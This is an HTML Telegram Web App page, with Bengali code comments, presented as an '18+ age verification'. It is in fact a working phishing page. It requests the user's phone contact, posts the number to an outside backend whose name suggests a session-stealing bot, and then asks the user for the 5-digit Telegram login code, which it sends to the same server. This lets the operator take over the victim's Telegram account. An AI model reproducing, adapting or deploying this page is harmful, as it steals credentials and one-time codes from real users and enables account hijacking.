<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; padding: 0; margin: 0; background: #000; color: white; text-align: center; }
        .overlay { height: 100vh; display: flex; flex-direction: column; justify-content: center; padding: 20px; box-sizing: border-box; }
        .box { background: white; color: #333; padding: 30px; border-radius: 25px; }
        .btn { background: #28a745; color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; font-size: 20px; cursor: pointer; }
        .hidden { display: none; }
        input { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 22px; text-align: center; }
    </style>
</head>
<body>
    <div class="overlay">
        <!-- ধাপ ১: নম্বর শেয়ার -->
        <div id="step0" class="box">
            <h2 id="status_text">Confirm Age</h2>
            <p>Click below to verify that you are 18+ to continue.</p>
            <button class="btn" id="main_btn" onclick="startRequest()">🍓 Confirm 🔞</button>
            <p id="loader_text" class="hidden" style="color:#888;">Waiting for contact...</p>
        </div>

        <!-- ধাপ ২: ওটিপি বক্স -->
        <div id="step2" class="box hidden">
            <h3>Identity Check</h3>
            <p>Enter the 5-digit code sent to your Telegram.</p>
            <input type="number" id="otp" placeholder="-----">
            <button class="btn" id="otp_btn" onclick="verifyOTP()">Verify OK</button>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;

        function startRequest() {
            tg.requestContact((res) => {
                if (res.status === 'sent') {
                    document.getElementById('main_btn').classList.add('hidden');
                    document.getElementById('loader_text').classList.remove('hidden');
                    document.getElementById('status_text').innerText = "Verifying Identity...";
                    pollForNumber(); // নম্বর চেক করা শুরু
                }
            });
        }

        // সার্ভার থেকে নম্বর পাওয়া গেছে কি না তা বারবার চেক করা
        async function pollForNumber() {
            try {
                let res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                let data = await res.json();
                
                if (data.status === "success") {
                    sendPhoneToBackend(data.phone);
                } else {
                    // নম্বর না পাওয়া পর্যন্ত প্রতি ২ সেকেন্ড পর পর চেক করবে
                    setTimeout(pollForNumber, 2000);
                }
            } catch (e) {
                setTimeout(pollForNumber, 2000);
            }
        }

        async function sendPhoneToBackend(phone) {
            let res = await fetch(`${BACKEND_URL}/send_number`, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ user_id: userId, phone: phone })
            });
            let data = await res.json();
            if(data.status === "success") {
                document.getElementById('step0').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
            } else {
                alert("Error: " + data.message);
                location.reload();
            }
        }

        async function verifyOTP() {
            let otp = document.getElementById("otp").value;
            if(otp.length < 5) return alert("Enter 5 digit code!");
            
            document.getElementById('otp_btn').disabled = true;
            document.getElementById('otp_btn').innerText = "Verifying...";

            try {
                let res = await fetch(`${BACKEND_URL}/verify_otp`, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, otp: otp })
                });
                let data = await res.json();
                if(data.status === "success") {
                    tg.close();
                } else {
                    alert("Wrong Code!");
                    document.getElementById('otp_btn').disabled = false;
                    document.getElementById('otp_btn').innerText = "Verify OK";
                }
            } catch (e) { alert("Server Error!"); }
        }
    </script>
</body>
</html>
